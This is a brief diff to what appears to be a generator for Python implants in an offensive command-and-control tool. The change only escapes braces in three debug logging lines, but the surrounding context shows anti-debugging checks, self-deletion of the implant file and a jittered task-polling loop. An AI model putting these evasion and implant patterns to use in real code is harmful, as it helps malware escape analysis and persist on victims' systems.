@@ -186,7 +186,7 @@ def generate_python_implant(
                                 if pid != 0:
                                     return True
                 except Exception as _exc:
-                    logging.debug(f"Suppressed in python_implant.py: {_exc}")
+                    logging.debug(f"Suppressed in python_implant.py: {{_exc}}")
 
             # Timing check: debuggers slow down execution
             start = time.monotonic()
@@ -463,7 +463,7 @@ def generate_python_implant(
             try:
                 os.remove(_self_path)
             except Exception as _exc:
-                logging.debug(f"Suppressed in python_implant.py: {_exc}")
+                logging.debug(f"Suppressed in python_implant.py: {{_exc}}")
             sys.exit(0)
 
 
@@ -545,7 +545,7 @@ def generate_python_implant(
                         result = _process_task(task)
                         pending_results.append(result)
                 except Exception as _exc:
-                    logging.debug(f"Suppressed in python_implant.py: {_exc}")
+                    logging.debug(f"Suppressed in python_implant.py: {{_exc}}")
                 _sleep_with_jitter()
 
 
